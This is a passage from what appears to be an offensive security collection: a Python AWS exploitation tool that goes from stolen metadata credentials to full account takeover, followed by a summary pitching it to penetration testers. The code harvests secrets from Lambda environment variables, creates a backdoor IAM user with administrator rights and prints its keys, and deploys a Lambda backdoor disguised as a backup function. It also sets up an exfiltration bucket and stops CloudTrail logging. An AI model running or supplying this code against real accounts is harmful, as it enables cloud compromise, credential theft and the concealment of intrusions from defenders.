            response = iam.list_users()
            print(f"  👥 Found {len(response['Users'])} IAM users")
            
            for user in response['Users'][:10]:  # Show first 10
                username = user['UserName']
                print(f"    👤 User: {username}")
                
                # Check for access keys
                self.check_iam_user_keys(username)
                
                # Check attached policies
                self.check_iam_user_policies(username)
            
            # List roles
            response = iam.list_roles()
            print(f"  🎭 Found {len(response['Roles'])} IAM roles")
            
            for role in response['Roles'][:10]:  # Show first 10
                role_name = role['RoleName']
                print(f"    🎭 Role: {role_name}")
                
                # Check role policies
                self.check_iam_role_policies(role_name)
                
        except ClientError as e:
            print(f"❌ IAM enumeration failed: {e}")
    
    def check_iam_user_keys(self, username):
        """Check IAM user access keys"""
        try:
            iam = self.session.client('iam')
            
            response = iam.list_access_keys(UserName=username)
            
            for key in response['AccessKeyMetadata']:
                key_id = key['AccessKeyId']
                status = key['Status']
                print(f"      🔑 Access Key: {key_id} ({status})")
                
        except Exception as e:
            print(f"      ❌ Key check failed: {e}")
    
    def check_iam_user_policies(self, username):
        """Check IAM user policies"""
        try:
            iam = self.session.client('iam')
            
            # Attached policies
            response = iam.list_attached_user_policies(UserName=username)
            for policy in response['AttachedPolicies']:
                policy_name = policy['PolicyName']
                if 'Admin' in policy_name or 'Full' in policy_name:
                    print(f"      ⚠️ High privilege policy: {policy_name}")
                    
                    self.compromised_resources.append({
                        'type': 'IAM User',
                        'name': username,
                        'issue': f"High privilege policy: {policy_name}",
                        'risk': 'High'
                    })
            
            # Inline policies
            response = iam.list_user_policies(UserName=username)
            for policy_name in response['PolicyNames']:
                print(f"      📜 Inline policy: {policy_name}")
                
        except Exception as e:
            print(f"      ❌ Policy check failed: {e}")
    
    def check_iam_role_policies(self, role_name):
        """Check IAM role policies"""
        try:
            iam = self.session.client('iam')
            
            # Attached policies
            response = iam.list_attached_role_policies(RoleName=role_name)
            for policy in response['AttachedPolicies']:
                policy_name = policy['PolicyName']
                if 'Admin' in policy_name or 'Full' in policy_name:
                    print(f"      ⚠️ High privilege policy: {policy_name}")
                    
        except Exception as e:
            print(f"      ❌ Role policy check failed: {e}")
    
    def enumerate_lambda_functions(self):
        """Enumerate Lambda functions"""
        print("⚡ Enumerating Lambda functions...")
        
        try:
            lambda_client = self.session.client('lambda')
            response = lambda_client.list_functions()
            
            for function in response['Functions']:
                function_name = function['FunctionName']
                runtime = function['Runtime']
                print(f"  ⚡ Function: {function_name} ({runtime})")
                
                # Get function code
                self.analyze_lambda_function(function_name)
                
        except ClientError as e:
            print(f"❌ Lambda enumeration failed: {e}")
    
    def analyze_lambda_function(self, function_name):
        """Analyze Lambda function for sensitive information"""
        try:
            lambda_client = self.session.client('lambda')
            
            # Get function configuration
            response = lambda_client.get_function(FunctionName=function_name)
            
            # Check environment variables
            env_vars = response['Configuration'].get('Environment', {}).get('Variables', {})
            if env_vars:
                print(f"    🔧 Environment variables:")
                for key, value in env_vars.items():
                    if any(sensitive in key.lower() for sensitive in ['password', 'secret', 'key', 'token']):
                        print(f"      ⚠️ {key}: {value}")
                        
                        self.compromised_resources.append({
                            'type': 'Lambda Function',
                            'name': function_name,
                            'issue': f"Sensitive environment variable: {key}",
                            'risk': 'Medium'
                        })
            
            # Download function code
            if 'Code' in response and 'Location' in response['Code']:
                print(f"    💾 Code location: {response['Code']['Location']}")
                
        except Exception as e:
            print(f"    ❌ Lambda analysis failed: {e}")
    
    def enumerate_rds_instances(self):
        """Enumerate RDS instances"""
        print("🗄️ Enumerating RDS instances...")
        
        try:
            rds = self.session.client('rds')
            response = rds.describe_db_instances()
            
            for db_instance in response['DBInstances']:
                db_id = db_instance['DBInstanceIdentifier']
                engine = db_instance['Engine']
                status = db_instance['DBInstanceStatus']
                
                print(f"  🗄️ Database: {db_id} ({engine}) - {status}")
                
                # Check if publicly accessible
                if db_instance.get('PubliclyAccessible'):
                    print(f"    ⚠️ Publicly accessible database!")
                    
                    self.compromised_resources.append({
                        'type': 'RDS Instance',
                        'name': db_id,
                        'issue': 'Publicly accessible',
                        'risk': 'High'
                    })
                
                # Check security groups
                for sg in db_instance.get('VpcSecurityGroups', []):
                    print(f"    🛡️ Security Group: {sg['VpcSecurityGroupId']}")
                    
        except ClientError as e:
            print(f"❌ RDS enumeration failed: {e}")
    
    def privilege_escalation(self):
        """Attempt privilege escalation"""
        print("⬆️ Attempting privilege escalation...")
        
        if not self.session:
            return False
        
        try:
            # Try to create new IAM user
            iam = self.session.client('iam')
            
            new_username = "backup-user"
            try:
                iam.create_user(UserName=new_username)
                print(f"✅ Created IAM user: {new_username}")
                
                # Attach admin policy
                iam.attach_user_policy(
                    UserName=new_username,
                    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
                )
                print(f"✅ Attached admin policy to {new_username}")
                
                # Create access keys
                response = iam.create_access_key(UserName=new_username)
                access_key = response['AccessKey']
                
                print(f"🔑 New admin credentials:")
                print(f"  Access Key: {access_key['AccessKeyId']}")
                print(f"  Secret Key: {access_key['SecretAccessKey']}")
                
                self.compromised_resources.append({
                    'type': 'IAM User',
                    'name': new_username,
                    'issue': 'Backdoor admin user created',
                    'risk': 'Critical'
                })
                
                return True
                
            except ClientError as e:
                print(f"❌ Failed to create IAM user: {e}")
                
        except Exception as e:
            print(f"❌ Privilege escalation failed: {e}")
        
        return False
    
    def establish_persistence(self):
        """Establish persistence in AWS environment"""
        print("🔒 Establishing persistence...")
        
        # Create Lambda backdoor
        self.create_lambda_backdoor()
        
        # Create S3 bucket for data exfiltration
        self.create_exfiltration_bucket()
        
        # Create CloudTrail bypass
        self.disable_cloudtrail_logging()
    
    def create_lambda_backdoor(self):
        """Create Lambda function backdoor"""
        try:
            lambda_client = self.session.client('lambda')
            
            # Lambda function code
            lambda_code = '''
import json
import boto3
import base64

def lambda_handler(event, context):
    # Backdoor functionality
    if event.get('action') == 'execute':
        command = event.get('command')
        if command:
            # Execute command (simplified)
            return {'status': 'executed', 'command': command}
    
    return {'status': 'ready'}
'''
            
            # Create ZIP file
            import zipfile
            import io
            
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
                zip_file.writestr('lambda_function.py', lambda_code)
            
            zip_buffer.seek(0)
            
            # Create Lambda function
            response = lambda_client.create_function(
                FunctionName='system-backup-function',
                Runtime='python3.9',
                Role='arn:aws:iam::123456789012:role/lambda-execution-role',  # Would need valid role
                Handler='lambda_function.lambda_handler',
                Code={'ZipFile': zip_buffer.read()},
                Description='System backup and maintenance function'
            )
            
            print(f"✅ Lambda backdoor created: {response['FunctionName']}")
            
        except Exception as e:
            print(f"❌ Lambda backdoor creation failed: {e}")
    
    def create_exfiltration_bucket(self):
        """Create S3 bucket for data exfiltration"""
        try:
            s3 = self.session.client('s3')
            
            bucket_name = f"backup-logs-{random.randint(1000, 9999)}"
            
            s3.create_bucket(Bucket=bucket_name)
            print(f"✅ Exfiltration bucket created: {bucket_name}")
            
            # Make bucket private but accessible to our role
            bucket_policy = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {"AWS": f"arn:aws:iam::123456789012:role/{self.credentials.get('RoleName', 'unknown')}"},
                        "Action": "s3:*",
                        "Resource": [
                            f"arn:aws:s3:::{bucket_name}",
                            f"arn:aws:s3:::{bucket_name}/*"
                        ]
                    }
                ]
            }
            
            s3.put_bucket_policy(
                Bucket=bucket_name,
                Policy=json.dumps(bucket_policy)
            )
            
            self.compromised_resources.append({
                'type': 'S3 Bucket',
                'name': bucket_name,
                'issue': 'Exfiltration bucket created',
                'risk': 'High'
            })
            
        except Exception as e:
            print(f"❌ Exfiltration bucket creation failed: {e}")
    
    def disable_cloudtrail_logging(self):
        """Attempt to disable CloudTrail logging"""
        try:
            cloudtrail = self.session.client('cloudtrail')
            
            # List trails
            response = cloudtrail.describe_trails()
            
            for trail in response['trailList']:
                trail_name = trail['Name']
                
                try:
                    # Stop logging
                    cloudtrail.stop_logging(Name=trail_name)
                    print(f"⚠️ Stopped CloudTrail logging: {trail_name}")
                    
                    self.compromised_resources.append({
                        'type': 'CloudTrail',
                        'name': trail_name,
                        'issue': 'Logging disabled',
                        'risk': 'Critical'
                    })
                    
                except ClientError as e:
                    print(f"❌ Failed to stop CloudTrail {trail_name}: {e}")
                    
        except Exception as e:
            print(f"❌ CloudTrail manipulation failed: {e}")
    
    def generate_aws_compromise_report(self):
        """Generate AWS compromise report"""
        report = f"""
# ☁️ AWS Cloud Compromise Report
**Generated:** {time.strftime('%Y-%m-%d %H:%M:%S')}

## 📊 Compromise Summary
- **Attack Vector:** SSRF to AWS Metadata Service
- **Credentials Obtained:** {self.credentials.get('RoleName', 'Unknown')}
- **Total Compromised Resources:** {len(self.compromised_resources)}
- **Privilege Level:** {self.credentials.get('AccessKeyId', 'Unknown')}

## 🎯 Compromised Resources
"""
        
        # Group by resource type
        resource_types = {}
        for resource in self.compromised_resources:
            res_type = resource['type']
            if res_type not in resource_types:
                resource_types[res_type] = []
            resource_types[res_type].append(resource)
        
        for res_type, resources in resource_types.items():
            report += f"
### {res_type} ({len(resources)} items)
"
            for resource in resources:
                report += f"- **{resource['name']}**: {resource['issue']} (Risk: {resource['risk']})
"
        
        report += f"""
## 🔑 Extracted Credentials
- **Access Key ID:** {self.credentials.get('AccessKeyId', 'N/A')}
- **Role Name:** {self.credentials.get('RoleName', 'N/A')}
- **Session Token:** {'Yes' if self.credentials.get('Token') else 'No'}

## 🔒 Persistence Mechanisms
1. Lambda backdoor function
2. S3 exfiltration bucket
3. CloudTrail logging disabled
4. Backdoor IAM user (if successful)

## 🛡️ Recommendations
1. Patch SSRF vulnerability immediately
2. Implement IMDSv2 requirement
3. Review and rotate all IAM credentials
4. Enable CloudTrail logging with integrity monitoring
5. Implement least privilege access
6. Regular security audits of AWS resources
7. Network segmentation and VPC security
"""
        
        with open('aws_compromise_report.md', 'w') as f:
            f.write(report)
        
        print(f"📋 AWS compromise report saved to: aws_compromise_report.md")
        print(f"☁️ Total AWS resources compromised: {len(self.compromised_resources)}")

# Usage
def main():
    aws_exploit = AWSCloudExploit()
    
    # Simulate SSRF discovery
    target_url = "https://vulnerable-app.example.com/fetch"
    param = "url"
    
    if aws_exploit.discover_aws_metadata(target_url, param):
        print("🎉 AWS metadata access successful!")
        
        # Enumerate resources
        aws_exploit.enumerate_aws_resources()
        
        # Attempt privilege escalation
        aws_exploit.privilege_escalation()
        
        # Establish persistence
        aws_exploit.establish_persistence()
        
        # Generate report
        aws_exploit.generate_aws_compromise_report()
    else:
        print("❌ AWS metadata access failed")

if __name__ == "__main__":
    main()
```

This comprehensive real-world attack scenarios collection provides:

1. **Corporate Network Penetration** - Complete methodology from reconnaissance to domain compromise
2. **AWS Cloud Infrastructure Compromise** - SSRF to full cloud environment takeover
3. **Detailed Exploitation Chains** - Step-by-step attack progression
4. **Persistence Mechanisms** - Multiple methods for maintaining access
5. **Lateral Movement Techniques** - Network propagation strategies
6. **Privilege Escalation** - Methods for gaining higher privileges
7. **Professional Reporting** - Comprehensive documentation of findings

Each scenario includes real-world techniques used by professional penetration testers and red teams, with complete code examples and detailed explanations.
